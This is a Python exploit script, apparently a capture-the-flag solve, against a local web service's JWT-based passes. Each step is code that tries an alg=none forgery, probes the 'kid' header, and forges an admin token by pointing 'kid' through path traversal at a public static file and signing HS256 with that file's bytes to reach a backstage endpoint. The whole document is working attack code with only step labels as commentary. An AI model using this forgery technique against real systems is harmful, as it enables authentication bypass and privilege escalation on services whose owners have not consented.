import http.client, json, base64, hmac, hashlib

HOST, PORT = "127.0.0.1", 8080

def b64u(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def b64u_dec(s):
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)

def req(method, path, body=None, token=None):
    c = http.client.HTTPConnection(HOST, PORT, timeout=10)
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = "Bearer " + token
    c.request(method, path, body=json.dumps(body) if body is not None else None, headers=headers)
    r = c.getresponse()
    data = r.read().decode()
    c.close()
    try:
        return r.status, json.loads(data)
    except Exception:
        return r.status, data

def sign_hs256(header, payload, key_bytes):
    seg = b64u(json.dumps(header, separators=(",", ":")).encode()) + "." + \
          b64u(json.dumps(payload, separators=(",", ":")).encode())
    sig = hmac.new(key_bytes, seg.encode(), hashlib.sha256).digest()
    return seg + "." + b64u(sig)

print("=== STEP 1: register, get an attendee pass ===")
st, j = req("POST", "/api/register", {"name": "arham"})
print(st, j)
token = j["pass"]

print("\n=== STEP 2: decode the pass (no key needed) ===")
h, p, s = token.split(".")
header = json.loads(b64u_dec(h))
payload = json.loads(b64u_dec(p))
print("header :", header)
print("payload:", payload)

print("\n=== STEP 3: naive forge with alg=none ===")
none_tok = b64u(json.dumps({"alg": "none", "typ": "JWT"}).encode()) + "." + \
           b64u(json.dumps({**payload, "role": "admin"}).encode()) + "."
st, j = req("GET", "/api/backstage", token=none_tok)
print(st, j)

print("\n=== STEP 4: probe the kid header with a bogus value ===")
probe = sign_hs256({"alg": "HS256", "typ": "JWT", "kid": "does-not-exist"},
                   {**payload, "role": "admin"}, b"anything")
st, j = req("GET", "/api/whoami", token=probe)
print(st, j)

print("\n=== STEP 5: pull a file with known bytes that traversal can reach ===")
c = http.client.HTTPConnection(HOST, PORT, timeout=10)
c.request("GET", "/static/brand.js")
r = c.getresponse()
brand = r.read()
c.close()
print("GET /static/brand.js ->", r.status, len(brand), "bytes")
print("sha256:", hashlib.sha256(brand).hexdigest())

print("\n=== STEP 6: forge admin pass, kid traverses to that file, sign HS256 with its bytes ===")
forged = sign_hs256({"alg": "HS256", "typ": "JWT", "kid": "../public/brand.js"},
                    {"sub": "arham", "role": "admin", "tier": "staff"}, brand)
print("forged:", forged[:60], "...")
st, j = req("GET", "/api/whoami", token=forged)
print("whoami:", st, j)

print("\n=== STEP 7: enter backstage ===")
st, j = req("GET", "/api/backstage", token=forged)
print(st, j)
